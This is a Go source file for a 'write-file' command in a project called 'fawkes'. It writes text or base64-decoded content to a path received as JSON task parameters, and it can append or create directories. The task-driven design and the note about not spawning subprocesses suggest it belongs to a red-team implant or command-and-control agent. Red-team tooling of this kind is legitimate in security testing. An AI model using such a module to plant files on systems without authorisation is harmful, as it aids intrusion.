package commands

import (
	"encoding/base64"
	"encoding/json"
	"os"
	"path/filepath"

	"fawkes/pkg/structs"
)

// WriteFileCommand implements the write-file command for writing content to files
type WriteFileCommand struct{}

func (c *WriteFileCommand) Name() string {
	return "write-file"
}

func (c *WriteFileCommand) Description() string {
	return "Write text or base64-decoded content to a file — create, overwrite, or append without spawning subprocesses"
}

type writeFileArgs struct {
	Path    string `json:"path"`
	Content string `json:"content"`
	Base64  bool   `json:"base64"`
	Append  bool   `json:"append"`
	MkDirs  bool   `json:"mkdir"`
}

func (c *WriteFileCommand) Execute(task structs.Task) structs.CommandResult {
	if task.Params == "" {
		return errorResult("Error: no parameters provided")
	}

	var args writeFileArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return errorf("Error parsing parameters: %v", err)
	}

	if args.Path == "" {
		return errorResult("Error: path is required")
	}

	if args.Content == "" {
		return errorResult("Error: content is required")
	}

	// Determine the data to write
	var data []byte
	if args.Base64 {
		decoded, err := base64.StdEncoding.DecodeString(args.Content)
		if err != nil {
			return errorf("Error decoding base64: %v", err)
		}
		data = decoded
	} else {
		data = []byte(args.Content)
	}

	// Create parent directories if requested
	if args.MkDirs {
		dir := filepath.Dir(args.Path)
		if err := os.MkdirAll(dir, 0755); err != nil {
			return errorf("Error creating directories: %v", err)
		}
	}

	// Determine file flags
	flags := os.O_WRONLY | os.O_CREATE
	if args.Append {
		flags |= os.O_APPEND
	} else {
		flags |= os.O_TRUNC
	}

	f, err := os.OpenFile(args.Path, flags, 0644)
	if err != nil {
		return errorf("Error opening file: %v", err)
	}
	defer f.Close()

	n, err := f.Write(data)
	if err != nil {
		return errorf("Error writing file: %v", err)
	}

	action := "Wrote"
	if args.Append {
		action = "Appended"
	}

	return successf("[+] %s %d bytes to %s", action, n, args.Path)
}
